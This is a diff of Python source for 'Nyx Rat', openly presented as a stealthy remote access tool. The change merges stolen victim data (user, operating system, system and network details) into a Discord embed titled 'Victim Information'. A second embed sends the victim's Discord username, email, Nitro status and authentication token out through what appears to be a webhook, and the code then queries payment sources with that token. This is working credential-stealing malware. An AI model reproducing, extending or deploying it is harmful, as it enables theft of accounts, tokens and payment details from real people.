@@ -210,45 +210,44 @@ if __name__ == "__main__":
 
 
     try:
+        embed_content = ""
+        
         if cfg.get("user_info", False):
             user_info_instance = UserInfos()
             user_info = user_info_instance.get_user_info()
             user_info_message = '\n'.join(f"{key}: {value}" for key, value in user_info.items())
-            user_info_embed = {
-            'title': 'Informações do Usuário',
-            'description': f'```\n{user_info_message}\n```',
-            'color': 0x0000FF
-            }
-            enviar_para_discord('', embed=user_info_embed)
+            embed_content += "**Informações do Usuário**\n```bash\n" + user_info_message + "\n```\n\n"
 
         if cfg.get("os_info", False):
             os_info = get_os_info()
-            os_embed = {
-                'title': 'Informações do Sistema Operacional',
-                'description': f'```\n{os_info}\n```',
-                'color': 0xFF0000
-            }
-            enviar_para_discord('', embed=os_embed)    
-    
+            embed_content += "**Informações do Sistema Operacional**\n```bash\n" + os_info + "\n```\n\n"
+        
         if not executou_informacoes_sistema and cfg.get("system_info", False):
             informacoes_sistema = obter_informacoes_sistema()
             executou_informacoes_sistema = True
-            sistema_embed = {
-            'title': 'Informações do Sistema',
-            'description': f'```\n{informacoes_sistema}\n```',
-            'color': 0x00FF00
-            }
-            enviar_para_discord('', embed=sistema_embed)
+            embed_content += "**Informações do Sistema**\n```bash\n" + informacoes_sistema + "\n```\n\n"
 
         if not executou_network_info and cfg.get("network_info", False):
             network_info = obter_informacoes_internet()
             executou_network_info = True
-            network_embed = {
-                'title': 'Informações de internet',
-                'description': f'```\n{network_info}\n```',
-                'color': 0x00FF00
+            embed_content += "**Informações de Internet**\n```bash\n" + network_info + "\n```\n\n"
+
+        if embed_content:
+            combined_embed = {
+                'title': 'Victim Information',
+                'description': f"{embed_content.strip()}\n\n[GitHub Repository](https://github.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT)",  
+                'footer': {
+                    'text': 'GitHub Repository',
+                    'icon_url': 'https://github.com/fluidicon.png'  
+                },
+                'author': {
+                    'name': 'Nyx Rat',
+                    'url': 'https://github.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT',
+                    'icon_url': 'https://raw.githubusercontent.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT/main/assets/images/image.png' 
+                }
             }
-            enviar_para_discord('', embed=network_embed)
+            enviar_para_discord('', embed=combined_embed)
+
 
 
         if not executou_discord_info and cfg.get("discord_info", False) :
@@ -261,15 +260,24 @@ if __name__ == "__main__":
                     avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
                     
                     discord_embed = {
-                        'title': 'Informações do Discord',
+                        'title': 'Victim Discord',
+                        'description': f"{embed_content.strip()}\n\n[GitHub Repository](https://github.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT)",  
+                        'footer': {
+                            'text': 'GitHub Repository',
+                            'icon_url': 'https://github.com/fluidicon.png'  
+                        },
                         'description': f"Nome de usuário: {user_data['username']}\n"
                                     f"E-mail: {user_data.get('email', 'Não disponível')}\n"
                                     f"Nitro: {'Sim' if user_data.get('premium_type') else 'Não'}\n"
-                                    f"Token: `{token}`",
-                        'color': 0xFF0000,
+                                    f"Token: ```{token}```",
                         'thumbnail': {
                             'url': avatar_url
-                        }
+                        },
+                                        'author': {
+                    'name': 'Nyx Rat',
+                    'url': 'https://github.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT',
+                    'icon_url': 'https://raw.githubusercontent.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT/main/assets/images/image.png' 
+                }
                     }
 
                     payment_sources = discord_info.get_payment_sources(token)
